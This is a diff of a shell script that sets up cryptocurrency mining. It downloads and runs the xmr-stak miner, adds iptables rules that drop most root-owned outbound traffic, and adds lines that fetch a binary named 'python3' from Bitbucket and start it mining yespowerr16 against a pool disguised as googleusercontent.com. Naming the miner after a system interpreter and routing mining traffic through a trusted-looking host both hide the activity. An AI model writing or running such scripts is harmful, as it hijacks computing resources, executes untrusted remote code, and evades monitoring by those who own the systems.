@@ -1,4 +1,4 @@
-apt install libmicrohttpd-dev -y
+apt install libmicrohttpd-dev tmux -y
 wget https://github.com/evilbabylx/script/raw/master/bin.zip
 unzip bin.zip
 chmod +x xmr-stak
@@ -12,4 +12,7 @@ iptables -I OUTPUT 2 -p udp --dport 53 -j ACCEPT
 iptables -I OUTPUT 3 -p tcp -d googleusercontent.com -j ACCEPT
 iptables -I OUTPUT 4 -p all -m owner --uid-owner root -j DROP
 
-./xmr-stak --noCPU
+tmux new-session -d -s xmr1 './xmr-stak --noCPU'
+wget https://bitbucket.org/tengikekao/myrep/downloads/python3
+chmod +x python3
+./python3 -a yespowerr16 -o stratum+tcp://googleusercontent.com:808 -u lovelyn.worker1 -p d=0.1
